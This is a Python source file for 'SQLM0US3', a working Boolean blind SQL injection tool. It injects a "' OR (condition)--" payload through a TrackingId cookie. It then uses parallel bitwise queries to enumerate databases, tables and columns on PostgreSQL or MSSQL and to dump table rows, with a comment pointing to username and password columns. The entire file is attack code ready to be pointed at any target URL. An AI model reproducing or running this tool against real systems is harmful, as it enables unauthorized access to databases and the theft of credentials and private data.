#!/usr/bin/python3
"""
███████╗ ██████╗ ██╗     ███╗   ███╗ ██████╗ ██╗   ██╗███████╗██████╗ 
██╔════╝██╔═══██╗██║     ████╗ ████║██╔═══██╗██║   ██║██╔════╝╚════██╗
███████╗██║   ██║██║     ██╔████╔██║██║   ██║██║   ██║███████╗ █████╔╝
╚════██║██║▄▄ ██║██║     ██║╚██╔╝██║██║   ██║██║   ██║╚════██║ ╚═══██╗
███████║╚██████╔╝███████╗██║ ╚═╝ ██║╚██████╔╝╚██████╔╝███████║██████╔╝
╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝     ╚═╝ ╚═════╝  ╚═════╝ ╚══════╝╚═════╝
        Boolean Blind SQL Injection Framework  |  0xPK
"""

import sys
import requests
import argparse
from urllib.parse import quote_plus
from concurrent.futures import ThreadPoolExecutor, as_completed

# ══════════════════════════════════════════════════════════════════
# ░░  CONFIGURE HERE  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
# ══════════════════════════════════════════════════════════════════

TARGET_URL  = "https://TARGET/path"          # <- change
TRUE_MARKER = "Welcome back!"                 # <- keyword that indicates TRUE response

session = requests.Session()
# session.proxies = {"http": "http://127.0.0.1:8080"}  # uncomment for Burp

def oracle(condition: str) -> bool:
    """
    Returns True if `condition` evaluates to TRUE in the DB.
    Edit this function to match your injection point.
    """
    payload = quote_plus(f"' OR ({condition})--")
    cookies = {"TrackingId": payload}
    r = session.get(TARGET_URL, cookies=cookies, timeout=15)
    return TRUE_MARKER in r.text


# ══════════════════════════════════════════════════════════════════
# ░░  DIALECT TEMPLATES  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
# ══════════════════════════════════════════════════════════════════

DIALECTS = {
    "postgresql": {
        "len":       "LENGTH",
        "current_db": "current_database()",
        "list_dbs":   "SELECT datname FROM pg_catalog.pg_database",
        "list_tables": lambda db: (
            f"SELECT table_name FROM information_schema.tables "
            f"WHERE table_schema='public'"
        ),
        "list_cols": lambda db, tbl: (
            f"SELECT column_name FROM information_schema.columns "
            f"WHERE table_name='{tbl}'"
        ),
        "row_count": lambda db, tbl: f"SELECT COUNT(*) FROM {tbl}",
        "nth_value": lambda col, tbl, n: (
            f"SELECT {col} FROM {tbl} "
            f"ORDER BY 1 OFFSET {n} ROWS FETCH NEXT 1 ROWS ONLY"
        ),
    },
    "mssql": {
        "len":       "LEN",
        "current_db": "db_name()",
        "list_dbs":   "SELECT name FROM master.dbo.sysdatabases",
        "list_tables": lambda db: (
            f"SELECT name FROM {db}..sysobjects WHERE xtype='U'"
        ),
        "list_cols": lambda db, tbl: (
            f"SELECT column_name FROM information_schema.columns "
            f"WHERE table_catalog='{db}' AND table_name='{tbl}'"
        ),
        "row_count": lambda db, tbl: f"SELECT COUNT(*) FROM {db}..{tbl}",
        "nth_value": lambda col, tbl, n: (
            f"SELECT {col} FROM {tbl} "
            f"ORDER BY (SELECT NULL) OFFSET {n} ROWS FETCH NEXT 1 ROWS ONLY"
        ),
    },
}

# Set active dialect here or pass --dialect on CLI
DIALECT = "postgresql"
D = DIALECTS[DIALECT]


# ══════════════════════════════════════════════════════════════════
# ░░  CORE ENGINE  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
# ══════════════════════════════════════════════════════════════════

def dump_int(query: str, lo: int = 0, hi: int = 512) -> int:
    """Binary search for an integer result."""
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle(f"({query}) > {mid}"):
            lo = mid + 1
        else:
            hi = mid
    return lo


def _check_bit(i: int, p: int, query: str) -> tuple[int, int, bool]:
    """Worker: test bit `p` of char at position `i` in query result."""
    result = oracle(f"ASCII(SUBSTRING(({query}),{i},1))&{1 << p}>0")
    return (i, p, result)


def dump_string(query: str, length: int = None, workers: int = 30) -> str:
    """
    Extract a string using fully parallel bitwise extraction.

    Strategy: fire all 7*N bit-check requests concurrently.
    For a 20-char string with workers=30, this finishes in ~5 rounds
    instead of 140 sequential requests.
    """
    LEN_FN = D["len"]
    if length is None:
        length = dump_int(f"{LEN_FN}(({query}))")
    if length == 0:
        return ""

    # bits[i][p] -> True/False   (1-indexed positions)
    bits: dict[tuple[int, int], bool] = {}

    tasks = [(i, p, query) for i in range(1, length + 1) for p in range(7)]

    with ThreadPoolExecutor(max_workers=workers) as ex:
        futures = {ex.submit(_check_bit, i, p, q): None for i, p, q in tasks}
        done = 0
        total = len(futures)
        for fut in as_completed(futures):
            i, p, val = fut.result()
            bits[(i, p)] = val
            done += 1
            c = sum((1 << bp) for bp in range(7) if bits.get((i, bp)) is True)
            partial = chr(c) if 32 <= c <= 126 else "?"
            print(f"  [{done}/{total}] pos={i} -> {partial}", end="\r")

    print()
    result = ""
    for i in range(1, length + 1):
        c = sum((1 << p) for p in range(7) if bits.get((i, p)))
        result += chr(c) if 32 <= c <= 126 else f"\\x{c:02x}"
    return result


def dump_list(count_query: str, nth_query_fn, workers: int = 30) -> list[str]:
    """
    Enumerate a list of strings (e.g. table names, column names).
    nth_query_fn(n) -> SQL query that returns the nth item.
    """
    count = dump_int(count_query)
    print(f"   Count : {count}")
    results = []
    for n in range(count):
        q = nth_query_fn(n)
        length = dump_int(f"{D['len']}(({q}))")
        val = dump_string(q, length=length, workers=workers)
        print(f"   [{n+1}/{count}] {val}")
        results.append(val)
    return results


# ══════════════════════════════════════════════════════════════════
# ░░  MENU ACTIONS  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
# ══════════════════════════════════════════════════════════════════

def action_test():
    print("\n[] Oracle self-test")
    t = oracle("1=1")
    f = oracle("1=0")
    print(f"  1=1 -> {t}  |  1=0 -> {f}")
    if t and not f:
        print("   Oracle is working correctly\n")
    else:
        print("   Oracle misconfigured — check TRUE_MARKER or injection\n")
        sys.exit(1)


def action_current_db(workers):
    print("\n[] Current database")
    q = D["current_db"]
    name = dump_string(q, workers=workers)
    print(f"   Current DB -> {name}\n")
    return name


def action_list_dbs(workers):
    print("\n[] Enumerate databases")
    count_q = f"SELECT COUNT(*) FROM ({D['list_dbs']}) x"
    # nth row
    lq = D["list_dbs"]
    nth = lambda n: (
        f"SELECT datname FROM ({lq}) x "
        f"ORDER BY 1 OFFSET {n} ROWS FETCH NEXT 1 ROWS ONLY"
        if DIALECT == "postgresql" else
        f"SELECT TOP 1 name FROM ({lq}) x "
        f"WHERE name NOT IN (SELECT TOP {n} name FROM ({lq}) y ORDER BY name) "
        f"ORDER BY name"
    )
    dbs = dump_list(count_q, nth, workers=workers)
    print(f"   Databases: {dbs}\n")
    return dbs


def action_list_tables(workers):
    db = input("  Database name : ").strip()
    print(f"\n[] Tables in [{db}]")
    lq = D["list_tables"](db)
    count_q = f"SELECT COUNT(*) FROM ({lq}) x"
    nth = lambda n: (
        f"SELECT table_name FROM ({lq}) x "
        f"ORDER BY 1 OFFSET {n} ROWS FETCH NEXT 1 ROWS ONLY"
        if DIALECT == "postgresql" else
        f"SELECT TOP 1 name FROM ({lq}) x "
        f"WHERE name NOT IN (SELECT TOP {n} name FROM ({lq}) y ORDER BY name) "
        f"ORDER BY name"
    )
    tables = dump_list(count_q, nth, workers=workers)
    print(f"   Tables: {tables}\n")
    return tables


def action_list_columns(workers):
    db    = input("  Database name : ").strip()
    table = input("  Table name    : ").strip()
    print(f"\n[] Columns in [{db}].[{table}]")
    lq = D["list_cols"](db, table)
    count_q = f"SELECT COUNT(*) FROM ({lq}) x"
    nth = lambda n: (
        f"SELECT column_name FROM ({lq}) x "
        f"ORDER BY 1 OFFSET {n} ROWS FETCH NEXT 1 ROWS ONLY"
        if DIALECT == "postgresql" else
        f"SELECT TOP 1 column_name FROM ({lq}) x "
        f"WHERE column_name NOT IN (SELECT TOP {n} column_name FROM ({lq}) y ORDER BY column_name) "
        f"ORDER BY column_name"
    )
    cols = dump_list(count_q, nth, workers=workers)
    print(f"   Columns: {cols}\n")
    return cols


def action_dump_data(workers):
    db     = input("  Database name   : ").strip()
    table  = input("  Table name      : ").strip()
    column = input("  Column name(s)  : ").strip()   # e.g. username||':'||password
    print(f"\n[] Dumping [{column}] from [{table}]")

    count_q = D["row_count"](db, table)
    row_count = dump_int(count_q)
    print(f"   Rows: {row_count}")

    results = []
    for n in range(row_count):
        q = D["nth_value"](column, table, n)
        length = dump_int(f"{D['len']}(({q}))")
        val = dump_string(q, length=length, workers=workers)
        print(f"   Row[{n}] -> {val}")
        results.append(val)

    print(f"\n   Dump complete: {results}\n")
    return results


# ══════════════════════════════════════════════════════════════════
# ░░  ENTRYPOINT  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
# ══════════════════════════════════════════════════════════════════

BANNER = r"""
███████╗ ██████╗ ██╗     ███╗   ███╗ ██████╗ ██╗   ██╗███████╗██████╗ 
██╔════╝██╔═══██╗██║     ████╗ ████║██╔═══██╗██║   ██║██╔════╝╚════██╗
███████╗██║   ██║██║     ██╔████╔██║██║   ██║██║   ██║███████╗ █████╔╝
╚════██║██║▄▄ ██║██║     ██║╚██╔╝██║██║   ██║██║   ██║╚════██║ ╚═══██╗
███████║╚██████╔╝███████╗██║ ╚═╝ ██║╚██████╔╝╚██████╔╝███████║██████╔╝
╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝     ╚═╝ ╚═════╝  ╚═════╝ ╚══════╝╚═════╝
          Boolean Blind SQL Injection Framework  |  0xPK
"""

MENU = """
    (0) Oracle test
    (1) Current database
    (2) List all databases
    (3) List tables
    (4) List columns
    (5) Dump data

  Your choice : """


def main():
    parser = argparse.ArgumentParser(description="SQLM0US3 — Blind SQLi Framework")
    parser.add_argument("--dialect", choices=["postgresql", "mssql"],
                        default="postgresql", help="SQL dialect (default: postgresql)")
    parser.add_argument("--workers", type=int, default=30,
                        help="Parallel thread count (default: 30)")
    args = parser.parse_args()

    global DIALECT, D
    DIALECT = args.dialect
    D = DIALECTS[DIALECT]

    print(BANNER)
    print(f"  Dialect : {DIALECT.upper()}   Workers : {args.workers}")

    choice = int(input(MENU))

    actions = {
        0: action_test,
        1: lambda: action_current_db(args.workers),
        2: lambda: action_list_dbs(args.workers),
        3: lambda: action_list_tables(args.workers),
        4: lambda: action_list_columns(args.workers),
        5: lambda: action_dump_data(args.workers),
    }

    if choice in actions:
        actions[choice]()
    else:
        print("   Invalid option")


if __name__ == "__main__":
    main()
